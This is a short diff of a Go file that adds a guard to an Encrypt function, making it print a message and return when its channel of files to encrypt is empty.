@@ -6,6 +6,10 @@ import (
 )
 
 func Encrypt(fileChannel *chan os.FileInfo, scanCompleteChannel *chan bool) {
+	if len(*fileChannel) == 0 {
+		fmt.Println("no file found to encrypt.exit.")
+		return
+	}
 	for true {
 		select {
 		case file := <-*fileChannel:
